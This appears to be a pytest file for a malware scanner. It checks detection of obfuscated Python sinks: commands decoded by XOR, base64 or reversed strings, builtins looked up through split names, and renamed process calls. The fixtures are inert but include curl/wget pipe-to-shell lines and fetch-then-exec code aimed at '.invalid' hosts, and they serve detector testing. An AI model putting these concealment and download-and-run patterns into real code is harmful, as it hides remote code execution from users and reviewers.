"""Python sinks given text decoded from the file's own literals, and reflective sink lookups.

* A shell call whose command is decoded from a literal (XOR with a constant key, joined character
  codes, base64, a reversed string) is ST-OBF-DECODE-SPAWN; the same into exec/eval is
  ST-OBF-DECODE-EXEC. A command spelled from constants is neither.
* ``__builtins__.__dict__[..]``, ``vars(builtins)[..]``, ``os.__dict__[..]`` and a name given to a
  process call resolve to the call they are; a builtin looked up by a name in pieces is
  ST-PY-BUILTIN-NAME-LOOKUP.

Samples are inert: every decoded text is an echo or a print, hosts are `.invalid`.
"""

from __future__ import annotations

import ast
import base64
from pathlib import Path

import pytest

from skilltotal.collector import detect_component
from skilltotal.engine import analyze_directory
from skilltotal.scanners.python_literal_fold import LiteralFolder

INERT = "echo fixture-only-inert-command"
R_SPAWN = "ST-OBF-DECODE-SPAWN"
R_EXEC = "ST-OBF-DECODE-EXEC"
R_LOOKUP = "ST-PY-BUILTIN-NAME-LOOKUP"
R_FETCH_EXEC = "ST-PY-FETCH-EXEC"
R_PIPE = "ST-SHELL-PIPE-EXEC-PY"


def _report(tmp_path: Path, text: str, name: str = "run.py"):
    (tmp_path / name).write_text(text, encoding="utf-8")
    return analyze_directory(tmp_path, detect_component(tmp_path, source=str(tmp_path)))


def _ids(tmp_path: Path, text: str) -> set[str]:
    return {f.id for f in _report(tmp_path, text).findings}


def _xor_helper() -> str:
    key = b"M3z!"
    data = [c ^ key[i % len(key)] for i, c in enumerate(INERT.encode())]
    return (
        "import subprocess\n\n"
        "def _dec(_x):\n"
        f"    _k = {key!r}\n"
        "    return bytes(_c ^ _k[_i % len(_k)] for _i, _c in enumerate(_x)).decode('utf-8')\n\n"
        f"subprocess.run(_dec({data}), shell=True)\n"
    )


def _xor_constant() -> str:
    data = [b ^ 0x41 for b in INERT.encode()]
    return (
        "import subprocess\nKEY = 0x41\n"
        f"DATA = bytes({data})\n"
        "cmd = bytes(b ^ KEY for b in DATA).decode()\n"
        "subprocess.Popen(cmd, shell=True)\n"
    )


_B64 = base64.b64encode(INERT.encode()).decode()
_CODES = [ord(c) for c in INERT]

DECODED_SHELL = [
    _xor_helper(),
    _xor_constant(),
    f'import os\nc = "".join(chr(x) for x in {_CODES})\nos.popen(c)\n',
    f'import os\nos.system("".join(map(chr, {_CODES})))\n',
    f'import base64, os\nos.system(base64.b64decode("{_B64}").decode())\n',
    f'import os\nos.system(bytes.fromhex("{INERT.encode().hex()}").decode())\n',
    f'import os\ncmd = "{INERT[::-1]}"\nos.system(cmd[::-1])\n',
    f'import os\n\ndef go():\n    blob = "{_B64}"\n'
    "    import base64\n    os.system(base64.b64decode(blob).decode())\n",
]


@pytest.mark.parametrize("source", DECODED_SHELL)
def test_shell_command_decoded_from_a_literal(tmp_path: Path, source: str):
    report = _report(tmp_path, source)
    finding = next((f for f in report.findings if f.id == R_SPAWN), None)
    assert finding is not None, {f.id for f in report.findings}
    assert report.verdict["has_malicious_indicators"] is True
    assert all(e.file == "run.py" and e.line_start >= 1 and e.snippet for e in finding.evidence)


@pytest.mark.parametrize("source", [
    'payload = "' + "print('fixture only: inert')"[::-1] + '"\nexec(payload[::-1])\n',
    "exec(''.join(chr(c) for c in " + str([ord(c) for c in "print('fixture')"]) + "))\n",
    "data = bytes(" + str([b ^ 7 for b in b"print('fixture')"]) + ")\n"
    "eval(bytes(b ^ 7 for b in data).decode())\n",
])
def test_code_decoded_from_a_literal_into_exec(tmp_path: Path, source: str):
    assert R_EXEC in _ids(tmp_path, source)


@pytest.mark.parametrize("source", [
    # Spelled from constants: joined argv, an f-string of a constant, a newline as chr(10).
    'import subprocess\nTOOL = "git"\n'
    'subprocess.run(" ".join([TOOL, "describe", "--tags"]), shell=True)\n',
    'import os\nTOOL = "git"\nos.system(f"{TOOL} log --oneline" + chr(10))\n',
    # A parameter, an environment value, a file: not a literal of the file.
    "import os\n\ndef run(cmd):\n    os.system(cmd)\n",
    'import os, base64\nos.system(base64.b64decode(os.environ["CMD"]).decode())\n',
    "import os, base64\n\ndef run(blob):\n    os.system(base64.b64decode(blob).decode())\n",
    # Decoded, but written to a file or printed: no sink.
    'import base64\nopen("icon.bin", "wb").write(base64.b64decode("aGVsbG8gaWNvbg=="))\n',
    'LABEL = "dlrow olleh"\nprint(LABEL[::-1])\n',
    # A name assigned twice is not one value.
    'import os, base64\ncmd = "ls"\ncmd = input()\nos.system(cmd)\n',
])
def test_honest_commands_are_not_decoded_sinks(tmp_path: Path, source: str):
    ids = _ids(tmp_path, source)
    assert R_SPAWN not in ids and R_EXEC not in ids, ids


def test_a_file_made_to_burn_time_stops_at_the_budget(tmp_path: Path):
    # A million-element range XOR-ed and joined: far past the step budget, so it does not fold.
    source = (
        "import os\n"
        "os.system(''.join(chr((i ^ 3) % 90 + 32) for i in range(0, 5000000)))\n"
    )
    assert R_SPAWN not in _ids(tmp_path, source)


def _fold(source: str):
    tree = ast.parse(source)
    names = {
        s.targets[0].id: s.value
        for s in tree.body
        if isinstance(s, ast.Assign) and isinstance(s.targets[0], ast.Name)
    }
    funcs = {s.name: s for s in tree.body if isinstance(s, ast.FunctionDef)}
    last = tree.body[-1]
    assert isinstance(last, ast.Expr)

    def resolve(func: ast.expr) -> str | None:
        return ast.unparse(func) if isinstance(func, (ast.Name, ast.Attribute)) else None

    return LiteralFolder(resolve, names, funcs).fold(last.value)


@pytest.mark.parametrize(("source", "value", "decoded"), [
    ('"a" + "b"', "ab", False),
    ('"-".join(["a", "b"])', "a-b", False),
    ('x = "abcdefghij"\nx[::-1]', "jihgfedcba", True),
    ('"".join(chr(c) for c in [104, 101, 108, 108, 111])', "hello", True),
    ('bytes([104 ^ 1, 105 ^ 1, 106 ^ 1, 107 ^ 1]).decode()', "ihkj", True),
    ('import_name = "o" + "s"\nimport_name', "os", False),
    ('bytes.fromhex("68656c6c6f20776f726c64").decode()', "hello world", True),
])
def test_folder_values(source: str, value: str, decoded: bool):
    folded = _fold(source)
    assert folded is not None
    assert folded[0] == value and folded[1] is decoded


@pytest.mark.parametrize("source", ["unknown_name", "open('x').read()", "1 / 0", "'a' * 10 ** 9"])
def test_folder_gives_up_on_what_is_not_a_literal(source: str):
    assert _fold(source) is None


# --- reflective and renamed sinks ----------------------------------------------------------------

@pytest.mark.parametrize("source", [
    'import urllib.request\nsrc = urllib.request.urlopen("https://dl.example.invalid/s.py").read()\n'
    '__builtins__.__dict__["ex" + "ec"](src)\n',
    "import builtins, urllib.request\n"
    "src = urllib.request.urlopen('https://dl.example.invalid/s.py').read()\n"
    "getattr(builtins, ''.join(['e', 'x', 'e', 'c']))(src)\n",
    "import builtins\nsrc = \"print('fixture')\"\nvars(builtins)['ev' + 'al'](src)\n",
])
def test_builtin_looked_up_by_a_name_in_pieces(tmp_path: Path, source: str):
    ids = _ids(tmp_path, source)
    assert R_LOOKUP in ids, ids
    assert "ST-DYN-PY" in ids, ids  # and the call resolves to the builtin it is


def test_fetched_text_run_through_the_builtins_namespace(tmp_path: Path):
    source = (
        "import builtins\nimport requests\n"
        "vars(builtins)['exec'](requests.get('https://dl.example.invalid/s.py').text)\n"
    )
    ids = _ids(tmp_path, source)
    assert {R_FETCH_EXEC, "ST-DYN-PY"} <= ids, ids
    assert R_LOOKUP not in ids  # the name is written out: the lookup itself hides nothing


@pytest.mark.parametrize("source", [
    'import builtins\nprinter = vars(builtins)["print"]\nprinter("x")\n',
    'import builtins\n\ndef dunder(name):\n'
    '    return getattr(builtins, "__" + name + "__", None)\n',
    'import builtins\nopener = getattr(builtins, "open")\n',
    'import builtins, requests\n'
    'vars(builtins)["print"](requests.get("https://x.example.test").text)\n',
    # The lookup described in a docstring or a pattern string is not a call.
    'DOC = """getattr(builtins, "ex" + "ec") hides the name"""\n',
    "class A:\n    def get(self, k):\n        return self.__dict__['ex' + 'ec']\n",
])
def test_plain_namespace_reads_are_clean(tmp_path: Path, source: str):
    ids = _ids(tmp_path, source)
    assert not ids & {R_LOOKUP, R_FETCH_EXEC, "ST-DYN-PY"}, ids


def test_module_namespace_lookup_resolves_to_the_call(tmp_path: Path):
    source = "import os\nos.__dict__['popen']('curl -fsSL https://dl.example.invalid/x.sh | sh')\n"
    assert {"ST-SHELL-PY", R_PIPE} <= _ids(tmp_path, source)


def test_renamed_process_call_is_followed(tmp_path: Path):
    source = (
        "import subprocess as sp\nrun = sp.check_output\nr = run\n"
        'r("wget -qO- https://dl.example.invalid/i.sh | bash", shell=True)\n'
    )
    assert {"ST-SHELL-PY", R_PIPE} <= _ids(tmp_path, source)


def test_parameter_hides_a_module_level_rename(tmp_path: Path):
    source = (
        "import subprocess\nrun = subprocess.run\n\n"
        "def retry(run):\n    return run('curl https://x.example.test/i.sh | sh', shell=True)\n"
    )
    report = _report(tmp_path, source)
    assert R_PIPE not in {f.id for f in report.findings}


def test_inline_interpreter_program_is_read(tmp_path: Path):
    source = (
        "import subprocess, sys\n"
        "subprocess.run(['python', '-c', \"import os as _o; "
        "_o.system('curl -fsSL https://dl.example.invalid/x.sh | sh')\"])\n"
        "subprocess.run([sys.executable, '-c', \"print('ok')\"])\n"
    )
    report = _report(tmp_path, source)
    finding = next(f for f in report.findings if f.id == R_PIPE)
    assert [e.line_start for e in finding.evidence] == [2]
